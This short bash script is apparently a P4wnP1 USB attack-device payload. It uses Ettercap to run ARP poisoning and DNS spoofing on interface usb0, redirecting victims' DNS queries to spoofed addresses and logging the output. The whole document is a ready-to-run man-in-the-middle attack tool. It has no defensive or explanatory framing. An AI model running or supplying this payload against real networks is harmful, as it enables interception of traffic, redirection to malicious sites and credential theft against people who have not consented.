#!/bin/bash
# /opt/p4wnp1/payloads/network/dns_spoof_redirect.sh
# Description: Redirect DNS queries to spoofed IP using Ettercap

set -euo pipefail

# === Config ===
PAYLOAD_NAME="dns_spoof_redirect"
INTERFACE="usb0"
LOG_DIR="/opt/p4wnp1/logs"
LOG_FILE="$LOG_DIR/${PAYLOAD_NAME}.log"

mkdir -p "$LOG_DIR"
exec > >(tee -a "$LOG_FILE") 2>&1

echo "[*] Starting DNS spoofing with Ettercap at $(date)"

# === Check ettercap availability ===
if ! command -v ettercap >/dev/null 2>&1; then
  echo "[!] Ettercap not found. Please install it before running this payload."
  exit 1
fi

# === Kill previous ettercap session ===
pkill -f ettercap || true
sleep 1

# === Launch ettercap in silent ARP + DNS spoof mode ===
echo "[+] Launching Ettercap on interface: $INTERFACE"
ettercap -T -q -i "$INTERFACE" -P dns_spoof -M arp:remote > "$LOG_FILE" 2>&1 &

echo "[✓] DNS spoofing active on $INTERFACE. Output logged to $LOG_FILE"
